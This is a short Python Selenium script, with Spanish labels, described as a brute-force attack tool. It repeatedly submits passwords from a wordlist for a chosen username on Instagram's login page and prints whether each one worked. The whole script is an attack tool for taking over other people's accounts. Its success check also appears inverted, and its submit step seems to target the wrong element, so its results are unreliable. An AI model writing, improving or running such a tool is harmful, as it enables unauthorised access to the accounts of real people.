from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from webdriver_manager.chrome import ChromeDriverManager
import time
import argparse

arg = argparse.ArgumentParser(description='Heramienta para hacer ataques de fuerza bruta')
arg.add_argument('-u',dest='usuario',help='Pasar un usuario',required=True)
arg.add_argument('-w',dest='wordlist',help='Pasar una Wordlist',required=True)
args = arg.parse_args()

user = args.usuario
wordlist = open (args.wordlist, 'r')
bot = webdriver.Chrome(ChromeDriverManager().install())

for clave in wordlist.readlines():
    bot.get('https://instagram.com/accounts/login/')
    time.sleep(1)
    username1 = bot.find_element_by_name('username').send_keys(user)
    time.sleep(1)
    password = bot.find_element_by_name('password').send_keys(clave)
    time.sleep(1)
    bot.find_element_by_class_name('password').send_keys(Keys.RETURN)
    time.sleep(1)
    if bot.current_url != 'https://instagram.com/accounts/onetap/?next=%2F':
       print (f'Clave correcta {clave}')
    else:
       print (f'Clave incorrecta {clave}')